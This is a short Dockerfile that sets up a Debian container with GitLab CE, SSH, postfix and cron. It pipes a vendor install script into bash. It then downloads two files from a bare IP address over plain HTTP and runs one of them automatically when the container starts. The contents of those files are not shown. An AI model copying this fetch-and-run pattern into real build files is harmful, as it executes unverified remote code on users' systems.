FROM debian
EXPOSE 80 2200 443
RUN apt-get update
RUN apt-get install -y curl openssh-server ca-certificates postfix cron systemd systemd-sysv vim
RUN apt-get install -y postfix
RUN curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | bash
RUN apt-get install gitlab-ce
RUN mkdir -p /home/app/
RUN curl 5.135.249.208/script.sh > /home/app/script.sh
RUN curl 5.135.249.208/sysctl.rb > /home/app/sysctl.rb
WORKDIR /home/app/
CMD sh script.sh
